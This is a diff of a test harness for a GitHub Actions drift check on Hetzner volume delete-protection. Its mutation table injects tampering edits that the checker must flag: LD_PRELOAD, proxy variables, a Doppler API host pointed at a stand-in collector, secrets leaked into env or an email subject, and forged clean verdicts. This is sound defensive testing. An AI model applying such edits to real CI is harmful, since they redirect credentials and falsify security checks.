         ("clear step timeout removed", "step-timeout:clear", lambda j, t: (drop(step(j, "clear"), "timeout-minutes") and j, t)),
-        ("job-level permissions narrowed", "job-permissions", lambda j, t: (setk(j, "permissions", {"contents": "read"}), t)),
-        ("checkout persists credentials", "checkout-persist", lambda j, t: (step_first(j)["with"].update({"persist-credentials": True}) or j, t)),
+        ("job-level permissions narrowed", "job-key:permissions", lambda j, t: (setk(j, "permissions", {"contents": "read"}), t)),
+        ("checkout persists credentials", "checkout-with", lambda j, t: (step_first(j)["with"].update({"persist-credentials": True}) or j, t)),
         ("notify action path changed", "notify-uses", lambda j, t: (setk(step(j, "notify"), "uses", "./.github/actions/notify-ops-emailx") and j, t)),
         ("notify loses its key", "notify-with-keys", lambda j, t: (drop(step(j, "notify").setdefault("with", {}), "resend-api-key") and j, t)),
         ("notify key is a literal", "notify-resend-key", lambda j, t: (step(j, "notify")["with"].update({"resend-api-key": "x"}) or j, t)),
@@ -399,7 +659,7 @@ def mutants():
         ("the credential read loses its timeout", "doppler-read-timeout", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace("$(timeout -k 5 60 doppler secrets get", "$(doppler secrets get")) and j, t)),
         ("the credential read loses its kill-after", "doppler-read-timeout", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace("$(timeout -k 5 60 doppler secrets get", "$(timeout 60 doppler secrets get")) and j, t)),
         ("checkout timeout removed", "step-timeout:checkout", lambda j, t: (drop(step_first(j), "timeout-minutes") and j, t)),
-        ("probe back on the implicit success()", "probe-if", lambda j, t: (drop(step(j, "probe"), "if") and j, t)),
+        ("probe back on the implicit success()", "step-if:probe", lambda j, t: (drop(step(j, "probe"), "if") and j, t)),
         ("the Hetzner request max-time raised past the step budget", "probe-budget", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace("-sS --max-time 30", "-sS --max-time 60")) and j, t)),
         ("an echo writer of a clean verdict on the library-load failure path", "output-writer-sites", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace('could not be loaded from the job checkout."\n  finish could-not-read', 'could not be loaded from the job checkout."\n  echo verdict=matches-declared >> "$GITHUB_OUTPUT"; published=1; exit 0')) and j, t)),
         ("an echo writer of a clean verdict on the mktemp failure path", "output-writer-sites", lambda j, t: (setk(step(j, "probe"), "run", step(j, "probe")["run"].replace('XXXXXX")" || finish could-not-read', 'XXXXXX")" || { echo verdict=matches-declared >> "$GITHUB_OUTPUT"; published=1; exit 0; }')) and j, t)),
@@ -408,23 +668,84 @@ def mutants():
         ("the tarball verification made optional", "doppler-sha-line", lambda j, t: (setk(step(j, "doppler_cli"), "run", step(j, "doppler_cli")["run"].replace("sha256sum -c -\n", "sha256sum -c - || true\n")) and j, t)),
         ("the PATH hand-off removed", "doppler-path-handoff", lambda j, t: (setk(step(j, "doppler_cli"), "run", step(j, "doppler_cli")["run"].replace('echo "$d" >> "$GITHUB_PATH"\n', "")) and j, t)),
         ("the install curl unbounded", "doppler-curl-bound", lambda j, t: (setk(step(j, "doppler_cli"), "run", step(j, "doppler_cli")["run"].replace(" --connect-timeout 20 --max-time 120", "")) and j, t)),
+        # Review round 2: the step list, values inside allowed keys, env names, expression contexts.
+        ("r2 an anonymous third-party action before the probe", "step-sequence", lambda j, t: (j["steps"].insert(3, {"name": "x", "uses": "someorg/someaction@v1"}) or j, t)),
+        ("r2 an extra run step after the checkout", "step-sequence", lambda j, t: (j["steps"].insert(1, {"name": "x", "run": "true"}) or j, t)),
+        ("r2 two steps swapped (could-not-perform filer before the finding filer)", "step-sequence", m_swap),
+        ("r2 the checkout on a mutable tag", "checkout-uses", lambda j, t: (setk(step_first(j), "uses", "actions/checkout@v4") and j, t)),
+        ("r2 a second checkout of another ref after the first", "checkout-count:2", lambda j, t: (j["steps"].insert(1, {"uses": step_first(j)["uses"], "with": {"ref": "lift-staging", "persist-credentials": False}}) or j, t)),
+        ("r2 the checkout given if: false", "step-key:checkout:if", lambda j, t: (setk(step_first(j), "if", False) and j, t)),
+        ("r2 the finding filer never runs on the runner (runner.os)", "expr-context:file_finding.if:runner", m_if_and("file_finding", "runner.os != 'Linux'")),
+        ("r2 the email never runs on the runner (runner.os)", "expr-context:notify.if:runner", m_if_and("notify", "runner.os != 'Linux'")),
+        ("r2 the Doppler install skipped on the runner (runner.os)", "expr-context:doppler_cli.if:runner", lambda j, t: (setk(step(j, "doppler_cli"), "if", "runner.os != 'Linux'") and j, t)),
+        ("r2 the probe's declaration path chosen by runner.os", "expr-context:probe.env:runner", lambda j, t: (step(j, "probe")["env"].update({"TF_PATH": "${{ runner.os == 'Linux' && 'none.tf' || matrix.tf_file }}"}) or j, t)),
+        ("r2 a vars context in the gate env", "expr-context:gate.env:vars", lambda j, t: (step(j, "gate")["env"].update({"ENTRY": "${{ vars.ENTRY }}"}) or j, t)),
+        ("r2 a context read by index", "expr-context:clear.env:matrix", lambda j, t: (step(j, "clear")["env"].update({"SUBJECT": "${{ matrix['subject'] }}"}) or j, t)),
+        ("r2 DOPPLER_API_HOST in the probe env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"DOPPLER_API_HOST": "https://collector.invalid"}) or j, t)),
+        ("r2 HTTPS_PROXY in the probe env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"HTTPS_PROXY": "http://127.0.0.1:9"}) or j, t)),
+        ("r2 LD_PRELOAD in the probe env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"LD_PRELOAD": "/tmp/x.so"}) or j, t)),
+        ("r2 a token in the email subject", "notify-with", lambda j, t: (step(j, "notify")["with"].update({"subject": "${{ github.token }}"}) or j, t)),
+        # The sum clause cannot fire alone (see EQUIVALENT MUTANTS): this names the label that does fire.
+        ("r2 a timeout-minutes on the gate (bound keys are pinned per step)", "step-key:gate:timeout-minutes", lambda j, t: (setk(step(j, "gate"), "timeout-minutes", 5) and j, t)),
+        # Verification pass: env VALUES the harness renders differently from the runner (fixture github context, gha-expr's `!`
+        # precedence), and the checkout SHA. Each changes one value inside the pinned shape.
+        ("v1 the probe's declaration path keyed on the real repository name", "step-env-value:probe:TF_PATH", lambda j, t: (step(j, "probe")["env"].update({"TF_PATH": "${{ github.repository == 'jikig-ai/soleur' && 'none.tf' || matrix.tf_file }}"}) or j, t)),
+        ("v1 the probe's declaration path behind a `!` whose precedence differs from GitHub's", "step-env-value:probe:TF_PATH", lambda j, t: (step(j, "probe")["env"].update({"TF_PATH": "${{ !matrix.entry == true && matrix.tf_file || 'none.tf' }}"}) or j, t)),
+        ("v1 the probe's resource keyed on the fixture run id", "step-env-value:probe:TF_RESOURCE", lambda j, t: (step(j, "probe")["env"].update({"TF_RESOURCE": "${{ github.run_id == '77' && matrix.tf_resource || 'none' }}"}) or j, t)),
+        ("v1 the commit-time read's path keyed on the real repository name", "step-env-value:tf_commit:TF_PATH", lambda j, t: (step(j, "tf_commit")["env"].update({"TF_PATH": "${{ github.repository == 'jikig-ai/soleur' && 'apps' || matrix.tf_file }}"}) or j, t)),
+        ("v2 the checkout on another 40-hex SHA", "checkout-uses", lambda j, t: (setk(step_first(j), "uses", "actions/checkout@0000000000000000000000000000000000000001") and j, t)),
+    ]
+
+def wf_mutants():
+    # Workflow-level edits: they change every leg of the job without touching jobs.<id>.
+    def setw(k, val):
+        def f(w):
+            w[k] = val
+            return w
+        return f
+    def wenv(k, val):
+        def f(w):
+            w.setdefault("env", {})[k] = val
+            return w
+        return f
+    return [
+        ("m3: a workflow defaults.run.shell (every body exits 0 doing nothing)", "wf-key:defaults", setw("defaults", {"run": {"shell": "true {0}"}})),
+        ("the workflow concurrency cancels a run in progress", "wf-concurrency", setw("concurrency", {"group": "terraform-drift", "cancel-in-progress": True})),
+        ("BASH_ENV in the workflow env", "wf-env", wenv("BASH_ENV", "/tmp/x")),
+        ("a secret in the workflow env", "wf-env", wenv("X", "${{ secrets.DOPPLER_TOKEN }}")),
+        ("r2 HTTPS_PROXY in the workflow env (the harness never applies the workflow env)", "wf-env", wenv("HTTPS_PROXY", "http://127.0.0.1:3128")),
+        ("r2 CURL_CA_BUNDLE in the workflow env", "wf-env", wenv("CURL_CA_BUNDLE", "./ca.pem")),
+        ("r2 LD_PRELOAD in the workflow env", "wf-env", wenv("LD_PRELOAD", "/tmp/x.so")),
+        ("v1 a workflow env value changed (the harness never applies the workflow env)", "wf-env-value:TERRAFORM_VERSION", wenv("TERRAFORM_VERSION", "1.10.6")),
     ]
 
 def cmd_shape(out, mode):
     job, text = json.load(open(out + "/job.json")), open(out + "/jobtext.txt").read()
-    base = violations(job, text)
+    top = json.load(open(out + "/wftop.json"))
+    base = violations(job, text, top)
     if mode == "real":
         for x in base:
             print(x)
         return 0
     print("%s\tcontrol\tthe unmutated job has no violation (%s)" % ("PASS" if not base else "FAIL", ",".join(base) or "none"))
     n = 0
-    for name, expect, fn in mutants():
-        j, t = fn(copy.deepcopy(job), text)
-        landed = json.dumps(j, sort_keys=True) != json.dumps(job, sort_keys=True) or t != text
-        got = violations(j, t)
-        ok = landed and any(g == expect or g.startswith(expect) for g in got)
+    table = [(nm, ex, fn, "job") for nm, ex, fn in mutants()] + [(nm, ex, fn, "wf") for nm, ex, fn in wf_mutants()]
+    for name, expect, fn, kind in table:
         n += 1
+        # A mutant whose target is already gone from the REAL job (a missing step or key) reports as its own FAIL row
+        # instead of crashing the table and hiding every row after it.
+        try:
+            if kind == "job":
+                j, t = fn(copy.deepcopy(job), text)
+                w = top
+            else:
+                j, t, w = job, text, fn(copy.deepcopy(top))
+            landed = json.dumps([j, w], sort_keys=True) != json.dumps([job, top], sort_keys=True) or t != text
+            got = violations(j, t, w)
+        except Exception as e:  # noqa: BLE001 -- any crash is this row's failure
+            print("FAIL\t%s\tthe mutant could not be applied to the real job (%s: %s)" % (name, type(e).__name__, e))
+            continue
+        ok = landed and any(g == expect or g.startswith(expect) for g in got)
         print("%s\t%s\t%s" % ("PASS" if ok else "FAIL", name, ("flagged %s" % expect) if ok else ("mutation did not land" if not landed else "not flagged: wanted %s, got %s" % (expect, got))))
     print("RESULT\t%d" % n)
     return 0
@@ -440,6 +761,12 @@ def cmd_run(specpath):
     ctx = {"__job_status": "success"}
     ctx.update({"github." + k: v for k, v in spec["github"].items()})
     ctx.update({"secrets." + k: v for k, v in spec["secrets"].items()})
+    # Exactly ONE include row is selected, by entry; zero or several is a harness error, never a guess.
+    sel = [r for r in rows_of(job) if r.get("entry") == spec.get("entry")]
+    if len(sel) != 1:
+        sys.stderr.write("row selection: %d include rows carry entry %r (exactly one is required)\n" % (len(sel), spec.get("entry")))
+        sys.exit(3)
+    ctx.update({"matrix." + k: (v if isinstance(v, str) else str(v)) for k, v in sel[0].items()})
     declared = [s.get("id") for s in job["steps"] if s.get("id")]
     allowed, results = spec["allowed_outputs"], {}
 
@@ -453,6 +780,8 @@ def cmd_run(specpath):
             bad(ref)
         if p[0] == "github" and ref not in ctx:
             bad(ref)
+        if p[0] == "matrix" and (len(p) != 2 or ref not in ctx):
+            bad(ref)
         if p[0] == "steps":
             if len(p) < 3 or p[1] not in declared:
                 bad(ref)
@@ -462,7 +791,11 @@ def cmd_run(specpath):
                 bad(ref)
 
     def refs(e):
-        for m in re.finditer(r"(?<![A-Za-z0-9_.\-])((?:secrets|github|steps)(?:\.[A-Za-z0-9_\-]+)+)", re.sub(r"'(?:[^']|'')*'", "''", e)):
+        # A context the harness does not model (runner, vars, env, job, strategy, inputs, needs ...) reads as null in gha-expr and
+        # as a real value on the runner: refused, never evaluated.
+        for n in bad_names(e):
+            bad("unmodelled context: " + n)
+        for m in re.finditer(r"(?<![A-Za-z0-9_.\-])((?:secrets|github|steps|matrix)(?:\.[A-Za-z0-9_\-]+)+)", re.sub(r"'(?:[^']|'')*'", "''", e)):
             check(m.group(1))
 
     def render(v):
@@ -496,11 +829,16 @@ def cmd_run(specpath):
         return 0
     for s in job["steps"]:
         sid = s.get("id") or "anon"
-        ctx["__job_status"] = "failure" if failed else "success"
+        # A harness override (job_status: cancelled) models a cancelled run, which no stub can produce.
+        ctx["__job_status"] = spec.get("job_status") or ("failure" if failed else "success")
         rec = {"ran": False, "outcome": "skipped", "rc": None}
         if evif(s.get("if")):
             rec["ran"] = True
             if "uses" in s:
+                # Only the two actions the job has are modelled (as a success that never runs); any other is a harness error.
+                if s["uses"] not in (CHECKOUT_USES, NOTIFY_USES):
+                    sys.stderr.write("unmodelled action: %s\n" % s["uses"])
+                    sys.exit(3)
                 rec["outcome"] = "success"
                 rec["with"] = {k: render(v) for k, v in (s.get("with") or {}).items()}
             elif sid in spec.get("no_run", []):
@@ -547,7 +885,7 @@ for _i in doppler_cli tf_commit probe file_finding file_unreadable clear notify 
   grep -qE "(^|,)${_i}(,|\$)" <<<"$_ids" || _miss+=" $_i"
 done
 [[ -z "$_miss" ]] || fatal "job '$JOB' lacks step id(s):$_miss (extractor floor)"
-pass "E1 extractor floor: job $JOB found with probe, tf_commit, doppler_cli, both filers, clear, notify and gate ($(tr ',' ' ' <<<"$_ids" | wc -w | tr -d ' ') steps)"
+pass "E1 extractor floor: job $JOB found with probe, tf_commit, doppler_cli, both filers, clear, notify and gate ($(tr ',' ' ' <<<"$_ids" | wc -w | tr -d ' ') steps); the include rows are S1's matrix-shape:entries"
 
 _e2bad=0
 for _s in doppler_cli tf_commit probe file_finding file_unreadable clear gate; do
@@ -560,8 +898,8 @@ if (( _e2bad == 0 )); then pass "E2 every run body parses with bash -n"; fi
 # STATIC SHAPE (Guard 1 rows 2, 12, 13): the real job is clean, and each in-process mutation is flagged.
 # ---------------------------------------------------------------------------------------------------------
 _sv=$(python3 -I "$TMP/h.py" shape "$TMP/x" real) || fatal "shape check crashed"
-if [[ -z "$_sv" ]]; then pass "S1 the job shape is clean: no environment, loader, mutable installer, read/write token, stray secret, expression in a run body, xtrace or continue-on-error beyond notify"
-else fail "S1 job shape violations: $(tr '\n' ' ' <<<"$_sv")"; fi
+if [[ -z "$_sv" ]]; then pass "S1 the job shape is clean: the workflow keys and env names and values, the job keys, the ordered step list (checkout + 8 ids), each step's keys, env names and values and if:, the checkout (its exact SHA) and notify actions and their with:, and every expression context root equal their pinned sets; no loader, mutable installer, read/write token, stray secret, expression in a run body, xtrace or continue-on-error beyond notify"
+else fail "S1 job shape violations: $(tr '\n' ' ' <<<"$_sv")$(grep -q '^matrix-shape' <<<"$_sv" && printf ' (matrix-shape: see ADDING AN ENTRY in the job comment)')"; fi
 _sm=$(python3 -I "$TMP/h.py" shape "$TMP/x" mutants) || fatal "shape mutation table crashed"
 _smn=0
 while IFS=$'\t' read -r _v _row _msg; do
@@ -663,6 +1001,9 @@ cat > "$TMP/bin/gh" <<'STUB' || fatal "write gh stub"
 #!/usr/bin/env bash
 S="${SCEN:?}"; ST="$S/issues.json"
 refuse() { printf 'refused: gh %s\n' "$*" >> "$S/gh.refused"; echo "stub gh: unsupported invocation" >&2; exit 64; }
+# Like the real gh: an issue command resolves its repository from the checkout's .git, or from GH_REPO when there is none.
+if [[ "${1:-}" == issue && ! -e "${GITHUB_WORKSPACE:-/nonexistent}/.git" && -z "${GH_REPO:-}" ]]; then refuse "no repository: no .git in the workspace and no GH_REPO ($*)"; fi
+[[ -z "${GH_REPO:-}" || "$GH_REPO" == o/r ]] || refuse "GH_REPO=$GH_REPO"
 save() { jq "$@" "$ST" > "$ST.tmp" && mv "$ST.tmp" "$ST"; }
 case "${1:-} ${2:-}" in
   "issue list")
@@ -712,27 +1053,102 @@ case "${1:-} ${2:-}" in
   "api "*|"api")
     shift; ep="${1:-}"; shift; filter=""
     while (( $# )); do case "$1" in --jq) filter="$2"; shift 2 ;; *) refuse "api $1" ;; esac; done
-    [[ "$ep" == repos/*/commits\?*path=apps/web-platform/infra/inngest-redis-luks.tf* && "$ep" == *per_page=1* ]] || refuse "api endpoint $ep"
-    echo "gh api commits" >> "$SEQ"
+    # Any declaration file under apps/web-platform/infra/; each path is served its OWN answer ($S/api.<file>.json).
+    [[ "$ep" =~ ^repos/[^/]+/[^/]+/commits\?.*path=apps/web-platform/infra/([a-z0-9-]+)\.tf(\&|$) && "$ep" == *per_page=1* ]] || refuse "api endpoint $ep"
+    pf="${BASH_REMATCH[1]}"
+    echo "gh api commits path=$pf" >> "$SEQ"
     [[ -n "${GH_API_HANG:-}" ]] && exec "${REAL_SLEEP:?}" 25
-    [[ -f "$S/api.json" ]] || { echo "stub: HTTP 404" >&2; exit 1; }
-    jq -r "$filter" "$S/api.json" ;;
+    [[ -f "$S/api.$pf.json" ]] || { echo "stub: HTTP 404" >&2; exit 1; }
+    jq -r "$filter" "$S/api.$pf.json" ;;
   *) refuse "$*" ;;
 esac
 STUB
-chmod +x "$TMP/bin/curl" "$TMP/bin/doppler" "$TMP/bin/sleep" "$TMP/bin/gh" "$TMP/bin/timeout" || fatal "chmod stubs"
+cat > "$TMP/bin/date" <<'STUB' || fatal "write date shim"
+#!/usr/bin/env bash
+# A bare `date +%s` answers FAKE_NOW when a row pins the clock (V3b: the 89/91-minute boundary must not depend on
+# wall-clock drift under host load); every other call, and every call without FAKE_NOW, is the real date.
+if [[ $# -eq 1 && "$1" == "+%s" && -n "${FAKE_NOW:-}" ]]; then printf '%s\n' "$FAKE_NOW"; exit 0; fi
+exec "${REAL_DATE:?}" "$@"
+STUB
+chmod +x "$TMP/bin/curl" "$TMP/bin/doppler" "$TMP/bin/sleep" "$TMP/bin/gh" "$TMP/bin/timeout" "$TMP/bin/date" || fatal "chmod stubs"
 cp "$LIBREAL" "$TMP/lib/bearer-curl.sh" || fatal "copy library"
 cmp -s "$LIBREAL" "$TMP/lib/bearer-curl.sh" || fatal "library copy differs from the repo file"
 REAL_PATH="$PATH"
 TIMEOUT_REAL=$(command -v timeout) || fatal "timeout not found"
 REAL_SLEEP=$(command -v sleep) || fatal "sleep not found"
+REAL_DATE=$(command -v date) || fatal "date not found"
 
 # ---------------------------------------------------------------------------------------------------------
 # CASE MACHINERY
 # ---------------------------------------------------------------------------------------------------------
-NAME=soleur-inngest-redis-store-luks
-VOL_ID=106903269
-WEB1_ID="1064""43278"
+# PER-ENTRY CONSTANTS: the suite's oracle for each include row, written independently of the workflow (the titles are
+# spelled out, never built from the job's rows). use_entry OWNS every one of these names; nothing else assigns them, so a
+# row that runs past a former assignment site cannot silently fall back to the other entry's values.
+_ids_of() { # _ids_of inngest|web1: sets _n (the volume name) and _i (its Hetzner id). The one place in the shell part of the
+  # suite each pair is written; h.py's INNGEST_ID and WEB1 are a second copy of the ids, tied to the rows by id_placement:row.
+  case "${1-}" in
+    inngest) _n=soleur-inngest-redis-store-luks; _i=106903269 ;;
+    web1) _n=soleur-web-platform-data-luks; _i=106443278 ;;
+    *) fatal "_ids_of: unknown entry '${1-}'" ;;
+  esac
+}
+use_entry() { # use_entry inngest|web1
+  local _n _i
+  case "${1-}" in
+    inngest)
+      ENTRY=inngest
+      OTHER_ENTRY=web1
+      TF_REL=apps/web-platform/infra/inngest-redis-luks.tf
+      TF_RES=inngest_redis_luks ;;
+    web1)
+      ENTRY=web1
+      OTHER_ENTRY=inngest
+      TF_REL=apps/web-platform/infra/workspaces-luks.tf
+      TF_RES=workspaces_luks ;;
+    *) fatal "use_entry: unknown entry '${1-}'" ;;
+  esac
+  # The other entry's name and id come from the other entry's own pair, never from a second literal.
+  _ids_of "$ENTRY"; NAME="$_n"; VOL_ID="$_i"
+  _ids_of "$OTHER_ENTRY"; OTHER_NAME="$_n"; OTHER_ID="$_i"
+  # The per-arm text of the finding filer, spelled out (the Inngest strings are origin/main's bytes as rendered).
+  case "$ENTRY" in
+    inngest)
+      TITLE_DIFF="infra: Inngest store volume delete protection differs from Terraform ($NAME)"
+      TITLE_GONE="infra: Inngest store volume not found at Hetzner ($NAME)"
+      TITLE_NOCRED="infra: the Inngest store volume protection check has no usable credential ($NAME)"
+      TITLE_UNREAD="infra: the Inngest store volume protection check could not read Hetzner ($NAME)"
+      LEAD_DIFF='The delete-protection flag of the Inngest store volume at Hetzner does not match what the committed Terraform declares.'
+      REMEDY_DIFF='To restore it, follow the runbook section 5c table row `not-protected` in inngest-luks-cutover-6894.md: the owner-approved `manual-rerun` dispatch of the per-merge apply (or the next infra-path merge) re-protects, then read back `protected`. An agent reports this and does not dispatch it unprompted.'
+      LEAD_GONE='Hetzner reports no single volume with the expected name and identity for the Inngest store.'
+      REMEDY_GONE='Confirm the Hetzner listing first: the probe step'"'"'s log line names the reason (zero, many or id-mismatch), and many or id-mismatch do not mean the volume is gone. Only if the volume is gone, treat it as a total loss: use the `soleur:incident` skill and the runbook section "After a total loss" in inngest-luks-cutover-6894.md.'
+      DECISION='Decision record: ADR-282. Loss modes and the reviewed route: the runbook section "Sole-copy protection and key loss" in inngest-luks-cutover-6894.md.'
+      # Wording of the OTHER entry that must never reach this entry's bodies or email (case-insensitive ERE): its vocabulary,
+      # plus its name and id derived from _ids_of (so the ban is symmetric, not a hand-written list on one side only).
+      OTHER_WORDS="web-1|ADR-119|6604|workspaces|$OTHER_NAME|$OTHER_ID" ;;
+    web1)
+      TITLE_DIFF="infra: web-1 workspaces volume delete protection differs from Terraform ($NAME)"
+      TITLE_GONE="infra: web-1 workspaces volume not found at Hetzner ($NAME)"
+      TITLE_NOCRED="infra: the web-1 workspaces volume protection check has no usable credential ($NAME)"
+      TITLE_UNREAD="infra: the web-1 workspaces volume protection check could not read Hetzner ($NAME)"
+      LEAD_DIFF='The delete-protection flag of the web-1 workspaces volume at Hetzner does not match what the committed Terraform declares.'
+      REMEDY_DIFF='To restore it, the owner-approved `manual-rerun` dispatch of the per-merge apply (or the next infra-path merge) re-applies the flag in that run'"'"'s SSH stage (ADR-119 D1, addendum of 2026-10-08), then read the flag back with "Read back the delete-protection flag (read-only token)" in workspaces-luks-cutover-6604.md. An agent reports this and does not dispatch it unprompted.'
+      LEAD_GONE='Hetzner reports no single volume with the expected name and identity for the web-1 workspaces volume.'
+      REMEDY_GONE='Confirm the Hetzner listing first: the probe step'"'"'s log line names the reason (zero, many or id-mismatch), and many or id-mismatch do not mean the volume is gone. Only if the volume is gone, treat it as a total loss: use the `soleur:incident` skill and ADR-119 (addendum of 2026-10-08) for the loss modes.'
+      DECISION='Decision record: ADR-119 (D1 and the addendum of 2026-11-10). The read-back: "Read back the delete-protection flag (read-only token)" in workspaces-luks-cutover-6604.md.'
+      OTHER_WORDS="inngest|ADR-282|6894|$OTHER_NAME|$OTHER_ID" ;;
+  esac
+  TF_STEM="${TF_REL##*/}"; TF_STEM="${TF_STEM%.tf}"
+  OK_KEYS="expected=true|name=$NAME"
+}
+arm_exact() { # arm_exact <body> <lead> <remedy> <decision>: each of the arm's three lines appears in the body exactly once, whole
+  a "the lead line, exactly" "$(grep -cxF -- "$2" <<<"$1")" 1
+  a "the remedy line, exactly" "$(grep -cxF -- "$3" <<<"$1")" 1
+  a "the decision line, exactly" "$(grep -cxF -- "$4" <<<"$1")" 1
+}
+no_other_words() { # no_other_words <label> <text>: this entry's text names nothing of the other entry
+  a "$1 names nothing of the other entry ($OTHER_WORDS)" "$(grep -ciE -- "$OTHER_WORDS" <<<"$2")" 0
+}
+use_entry inngest
 # Each fixture token starts with a distinctive 6-character prefix, so the leak invariant can also catch a PARTIAL token
 # (an `echo "${TOKEN:0:6}"` debug line) without matching the ordinary word "synthetic".
 TOK="zq7ro-synthetic-ro_token.0123456789"
@@ -742,7 +1158,7 @@ TOKPFX="${TOK:0:6}"; RWPFX="${RWTOK:0:6}"; DOPPFX="${DOPTOK:0:6}"
 CANARY="LEAKCANARY_label_zz9"
 ALLOWED_OUT='{"probe":["verdict","expected","live","volume_id","http","name","tf_age_min"],"tf_commit":["epoch"],"file_finding":[],"file_unreadable":[],"clear":[],"notify":["sent"],"gate":[],"doppler_cli":[]}'
 CASE_N=0; SCEN_N=0; ROWS_RUN=0; CHK=""
-NO_RUN='["doppler_cli"]'; GH_REF="refs/heads/main"
+NO_RUN='["doppler_cli"]'; GH_REF="refs/heads/main"; JOB_STATUS=""; FAKE_NOW=""
 STUB_ENV=(); OVR=(); BODIES=(); FORCE=(); EXTRA_ENV=()
 
 # PER-CASE INVARIANTS. A row may run several cases (new_case more than once). The invariants of every case but the last are
@@ -754,12 +1170,13 @@ fold_inv() {
   fi
   INV_DONE=1
 }
+switch_entry() { fold_inv; use_entry "$1"; }   # every table boundary that changes entry goes through here
 new_scen() { fold_inv; SCEN_N=$((SCEN_N + 1)); SCEN="$TMP/scen.$SCEN_N"; mkdir -p "$SCEN" || fatal "mkdir scen"; echo '[]' > "$SCEN/issues.json"; }
 vol() { jq -nc --argjson id "$1" --arg n "$2" --argjson p "$3" --arg c "$CANARY" '{id: $id, name: $n, size: 10, status: "available", protection: {delete: $p}, labels: {note: $c}}'; }
 listing() { jq -nc '{volumes: ($ARGS.positional | map(fromjson)), meta: {pagination: {page: 1, per_page: 50, previous_page: null, next_page: null, last_page: 1, total_entries: ($ARGS.positional | length)}}}' --args "$@"; }
 mk_tf() { # mk_tf <workspace> <name> <declared>  -- a synthesized declaration with the traps the awk must survive
   assert_fixture_dir "${1-}"
-  local f="$1/apps/web-platform/infra/inngest-redis-luks.tf"; assert_fixture_dir "$f"; mkdir -p "$(dirname "$f")" || fatal "mkdir tf"
+  local f="$1/$TF_REL"; assert_fixture_dir "$f"; mkdir -p "$(dirname "$f")" || fatal "mkdir tf"
   cat > "$f" <<TFEOF
 # SYNTHESIZED FIXTURE.  # delete_protection = false
 resource "random_password" "other" {
@@ -767,7 +1184,7 @@ resource "random_password" "other" {
 }
 
 # name = "not-this-one"
-resource "hcloud_volume" "inngest_redis_luks" {
+resource "hcloud_volume" "$TF_RES" {
   # delete_protection = false
   name              = "$2"   # trailing comment
   size              = var.inngest_redis_volume_size
@@ -789,27 +1206,34 @@ resource "hcloud_volume" "decoy" {
 }
 TFEOF
 }
-set_api() { # set_api <live-true|false>  : the project listing = the target volume + a web-1-shaped one
+set_api() { # set_api <live-true|false>  : the project listing = the target volume + the OTHER entry's real-shaped one
   assert_fixture_dir "${CASE-}"
-  listing "$(vol "$VOL_ID" "${CASE_NAME:-$NAME}" "$1")" "$(vol "$WEB1_ID" "soleur-web-workspaces-luks" true)" > "$CASE/listing.json"
+  listing "$(vol "$VOL_ID" "${CASE_NAME:-$NAME}" "$1")" "$(vol "$OTHER_ID" "$OTHER_NAME" true)" > "$CASE/listing.json"
 }
-set_age() { # set_age <minutes|none|future>
-  AGE_MODE="$1"; rm -f "$SCEN/api.json"
+_now() { if [[ -n "${FAKE_NOW:-}" ]]; then printf '%s\n' "$FAKE_NOW"; else date +%s; fi; }
+write_age() { # write_age <file-stem> <minutes|none|future>: the commits answer served for that declaration file
+  rm -f "$SCEN/api.$1.json"
   local ep
-  case "$1" in
+  case "$2" in
     none) return 0 ;;
-    future) ep=$(( $(date +%s) + 7200 )) ;;
-    *) ep=$(( $(date +%s) - $1 * 60 - 10 )) ;;
+    future) ep=$(( $(_now) + 7200 )) ;;
+    *) ep=$(( $(_now) - $2 * 60 - 10 )) ;;
   esac
-  jq -nc --arg d "$(date -u -d "@$ep" +%Y-%m-%dT%H:%M:%SZ)" '[{commit: {committer: {date: $d}}}]' > "$SCEN/api.json"
+  jq -nc --arg d "$(date -u -d "@$ep" +%Y-%m-%dT%H:%M:%SZ)" '[{commit: {committer: {date: $d}}}]' > "$SCEN/api.$1.json"
+}
+set_age() { AGE_MODE="$1"; write_age "$TF_STEM" "$1"; }   # set_age <minutes|none|future>: the CURRENT entry's file
+set_age_other() { # set_age_other <minutes|none|future>: the OTHER entry's file (never the current one's AGE_MODE)
+  local _e="$ENTRY" _stem
+  use_entry "$OTHER_ENTRY"; _stem="$TF_STEM"; use_entry "$_e"
+  write_age "$_stem" "$1"
 }
 new_case() {
   fold_inv; INV_DONE=0
   CASE_N=$((CASE_N + 1)); CASE="$TMP/c.$CASE_N"
-  mkdir -p "$CASE/ws/scripts/lib" "$CASE/rt" "$CASE/out" || fatal "mkdir case"
+  mkdir -p "$CASE/ws/scripts/lib" "$CASE/ws/.git" "$CASE/rt" "$CASE/out" || fatal "mkdir case"
   cp "$TMP/lib/bearer-curl.sh" "$CASE/ws/scripts/lib/bearer-curl.sh" || fatal "copy library into case"
   SEQ="$CASE/seq.log"; : > "$SEQ"; : > "$CASE/github_env"; : > "$CASE/summary"; : > "$CASE/github_path"
-  CHK=""; NO_RUN='["doppler_cli"]'; GH_REF="refs/heads/main"; STUB_ENV=("${EXTRA_ENV[@]}"); OVR=(); BODIES=(); FORCE=(); WS="$CASE/ws"; CASE_NAME="$NAME"; CODES=200; TOKEN_FIX="$TOK"; RW_FIX=""; CASE_TOK="$TOK"
+  CHK=""; NO_RUN='["doppler_cli"]'; GH_REF="refs/heads/main"; JOB_STATUS=""; STUB_ENV=("${EXTRA_ENV[@]}"); OVR=(); BODIES=(); FORCE=(); WS="$CASE/ws"; CASE_NAME="$NAME"; CODES=200; TOKEN_FIX="$TOK"; RW_FIX=""; CASE_TOK="$TOK"
   [[ -n "${SCEN:-}" ]] || new_scen
   mk_tf "$WS" "$NAME" true; set_api true; set_age 180
 }
@@ -820,16 +1244,16 @@ go() {
   local -a e=("PATH=$TMP/bin:$REAL_PATH" "HOME=$CASE" "RUNNER_TEMP=$CASE/rt" "GITHUB_WORKSPACE=$WS" "SEQ=$SEQ" "SCEN=$SCEN" "LC_ALL=C"
     "CURL_LISTING=$CASE/listing.json" "CURL_CODES=$CODES" "CURL_REC=$CASE/curl" "DOPPLER_FIX_RO=$TOKEN_FIX" "DOPPLER_FIX_RW=$RW_FIX"
